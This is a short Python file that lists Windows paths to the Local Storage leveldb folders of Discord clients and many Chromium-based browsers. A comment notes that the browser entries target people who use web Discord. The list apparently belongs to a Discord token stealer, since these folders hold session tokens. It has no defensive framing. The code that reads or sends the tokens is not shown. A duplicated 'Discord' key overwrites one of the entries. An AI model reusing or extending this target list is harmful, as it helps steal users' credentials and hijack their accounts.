import os

ALL_DISCORD_PATH: dict[str, str] = {
    "Discord":       os.path.join(os.getenv("APPDATA"), "Discord", "Local Storage", "leveldb"),
    "Discord":       os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"),
    "DiscordCanary": os.path.join(os.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
    "DiscordPTB":    os.path.join(os.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
    "DiscordDev":    os.path.join(os.getenv("APPDATA"), "discorddevelopment", "Local Storage", "leveldb"),

    #// Browser sessions where people use web discord
    "Opera":          os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
    "OperaGX":        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
    "Amigo":          os.path.join(os.getenv("LOCALAPPDATA"), "Amigo", "User Data", "Local Storage", "leveldb"),
    "Torch":          os.path.join(os.getenv("LOCALAPPDATA"), "Torch", "User Data", "Local Storage", "leveldb"),
    "Kometa":         os.path.join(os.getenv("LOCALAPPDATA"), "Kometa", "User Data", "Local Storage", "leveldb"),
    "Orbitum":        os.path.join(os.getenv("LOCALAPPDATA"), "Orbitum", "User Data", "Local Storage", "leveldb"),
    "CentBrowser":    os.path.join(os.getenv("LOCALAPPDATA"), "CentBrowser", "User Data", "Local Storage", "leveldb"),
    "7Star":          os.path.join(os.getenv("LOCALAPPDATA"), "7Star", "7Star", "User Data", "Local Storage", "leveldb"),
    "Sputnik":        os.path.join(os.getenv("LOCALAPPDATA"), "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),
    "Vivaldi":        os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),
    "Chrome":         os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
    "ChromeSxS":      os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb"),
    "ChromeProfile1": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),
    "ChromeProfile2": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),
    "Epic":           os.path.join(os.getenv("LOCALAPPDATA"), "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),
    "Edge":           os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
    "Uran":           os.path.join(os.getenv("LOCALAPPDATA"), "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),
    "Yandex":         os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),
    "Brave":          os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
    "Iridium":        os.path.join(os.getenv("LOCALAPPDATA"), "Iridium", "User Data", "Default", "Local Storage", "leveldb"),
}